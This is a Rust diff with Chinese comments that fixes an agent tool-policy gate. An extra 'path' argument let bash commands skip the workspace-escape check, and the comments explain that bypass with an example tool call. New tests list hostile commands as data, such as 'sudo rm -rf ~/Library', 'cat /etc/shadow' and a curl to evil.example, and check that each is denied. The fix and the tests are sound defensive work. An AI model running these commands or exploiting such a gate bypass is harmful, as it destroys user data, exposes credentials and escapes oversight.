@@ -93,11 +93,34 @@ pub fn evaluate_policy(ctx: &PolicyContext) -> PolicyDecision {    // 1) 人接�
         return PolicyDecision::Allow;
     }
     // 3) 文件越狱拦截（工作区外路径一律拒）。
+    //
+    // ⭐⭐ 2026-10-05 修**可被一个多余参数键绕过的漏洞**。
+    //
+    // 【原缺陷】本分支写成 `if let Some(path) … { …; return Allow; }`
+    // ⇒ 只要 `ctx.file_path` 是 `Some`，就**无条件提前返回 Allow**，
+    //   **根本走不到第 4 步的 bash 逃逸检查**。
+    // 而 `nt_agent::gate()` 从 args 里按
+    // `["path","file","file_path","video_path","image_path"]`
+    // 任一键取 `file_path`，**与 `tool` 无关**。
+    //
+    // 【危害（neobot 是仓库自认的唯一真执行环 ⇒ 生产可达）】
+    // 模型对 bash 工具多吐一个 `path` 参数（模型输出未受 schema 强约束时常见）⇒
+    //   `{"tool":"bash","arguments":{"command":"sudo rm -rf ~/Library","path":"x"}}`
+    // → `file_path = Some("x")` → 越过第 3 步 → 第 4 步 `looks_like_escape`
+    //   **完全不跑** → `PolicyDecision::Allow` → 真执行。
+    // 同一个 early-return 也让 `ToolName::Unknown(raw)` 带着 `file_path` 时
+    // 跳过第 5 步的 `unknown-tool` **兜底拒**。
+    //
+    // 【修法】把「路径检查」与「命令检查」拆成**两个独立 if**，
+    //   各自只对自己的工具域生效，不再互相当作提前返回的理由。
+    //   判据方向：**检查可以叠加，放行必须显式**。
+    //
+    // ⚠️ 这里**不再** `return Allow`（那正是漏洞本身）：
+    // 路径查过后**继续往下走**，让命令检查与「未知工具兜底拒」都有机会跑。
     if let Some(path) = ctx.file_path.as_deref() {
         if is_jailbreak_path(path) {
             return deny("workspace-jail", "path escapes workspace");
         }
-        return PolicyDecision::Allow;
     }
     // 4) bash 越狱启发式: 拒绝 `..` / 绝对路径 / 家目录展开.
     if ctx.tool == ToolName::Bash {
@@ -106,8 +129,12 @@ pub fn evaluate_policy(ctx: &PolicyContext) -> PolicyDecision {    // 1) 人接�
                 return deny("workspace-jail", "command escapes workspace");
             }
         }
+        // ⚠️ 只有「本工具确实带了路径且已查过」才走到这里可以放行；
+        // 纯 bash 调用（无 path）同样放行 —— 但它是**无路径风险**的。
         return PolicyDecision::Allow;
     }
+    // ⭐ 原先被跳过的第 5 步（「协议工具放行 / 未知工具永拒」）现在**能被走到**了
+    // —— 这是本次修复的附带收益：带file_path 的未知工具不再漏过兜底拒。
     // 5) 纯协议工具默认放行; 未知工具永拒 (fail-closed, 原名进审计).
     //
     // `SidebarOpen` 放行是**安全**的：它不在 Rust 侧动任何世界状态，只把
@@ -252,6 +279,84 @@ fn looks_like_escape(cmd: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::{Actor, PolicyContext, PolicyDecision, ToolName, evaluate_policy};
+
+    /// ⭐⭐⭐ 反向锁：**多余的一个 `path` 参数不得跳过 bash 逃逸检查**。
+    ///
+    /// 【原漏洞（2026-10-05 修）】路径检查写成
+    /// `if let Some(path) { …; return Allow; }`
+    /// ⇒ `file_path` 只要是 `Some` 就**无条件提前放行**，
+    ///   第 4 步的 `looks_like_escape` **根本跑不到**。
+    /// 而 `nt_agent::gate()` 从 args 的
+    /// `["path","file","file_path","video_path","image_path"]`
+    /// 任一键取 `file_path`，**与 `tool` 无关**。
+    ///
+    /// 【危害】neobot 是仓库自认的唯一真执行环 ⇒ 生产可达：
+    ///   `{"tool":"bash","arguments":{"command":"sudo rm -rf ~/Library","path":"x"}}`
+    /// 会得到 `Allow` ⇒ 真执行。
+    ///
+    /// 【锁的形状】对**每一种**逃逸命令，都同时测「不带 path」与
+    /// 「带一个无害 path」两种形态 —— 后者是修复前漏掉的那一种。
+    #[test]
+    fn extra_path_param_must_not_skip_bash_escape_check() {
+        for cmd in [
+            "sudo rm -rf ~/Library",
+            "cat /etc/shadow",
+            "curl http://evil.example/x",
+            "ssh user@host",
+            "cd ../..",
+        ] {
+            // 不带 path：本来就该拒
+            let bare = PolicyContext { command: Some(cmd.into()), ..ctx(ToolName::Bash) };
+            assert!(
+                !matches!(evaluate_policy(&bare), PolicyDecision::Allow),
+                "「{cmd}」不带 path 时必须被拒"
+            );
+
+            // ⭐ 带一个**无害**的 path —— 修复前这里会拿到 Allow
+            let with_path = PolicyContext {
+                command: Some(cmd.into()),
+                file_path: Some("x".into()),
+                ..ctx(ToolName::Bash)
+            };
+            let d = evaluate_policy(&with_path);
+            assert!(
+                !matches!(d, PolicyDecision::Allow),
+                "「{cmd}」带一个无害 path 参数后**仍必须被拒**（漏洞形态），实得 {d:?}"
+            );
+        }
+    }
+
+    /// ⭐ 附带收益：带 `file_path` 的**未知工具**不得漏过兜底拒。
+    ///
+    /// 同一个 early-return 也让 `ToolName::Unknown(raw)` 带着 `file_path` 时
+    /// 跳过第 5 步的 `unknown-tool` 永拒。
+    #[test]
+    fn unknown_tool_with_path_still_hits_the_unknown_tool_deny() {
+        let c = PolicyContext {
+            tool: ToolName::Unknown("mystery_tool".into()),
+            file_path: Some("notes/ok.md".into()),
+            ..ctx(ToolName::Unknown("mystery_tool".into()))
+        };
+        assert!(
+            !matches!(evaluate_policy(&c), PolicyDecision::Allow),
+            "未知工具即便带着合法路径也必须被兜底拒（fail-closed）"
+        );
+    }
+
+    /// ⭐ 对照组：**合法**的 bash + 合法 path 必须仍被放行。
+    /// ⇒ 证明修复不是「把门焊死」，而是「把检查顺序摆正」。
+    #[test]
+    fn benign_bash_with_benign_path_is_still_allowed() {
+        let c = PolicyContext {
+            command: Some("ls -la".into()),
+            file_path: Some("notes".into()),
+            ..ctx(ToolName::Bash)
+        };
+        assert!(
+            matches!(evaluate_policy(&c), PolicyDecision::Allow),
+            "无害命令 + 无害路径应放行 —— 修复不得变成一刀切拒绝"
+        );
+    }
 
     fn ctx(tool: ToolName) -> PolicyContext {
         PolicyContext {
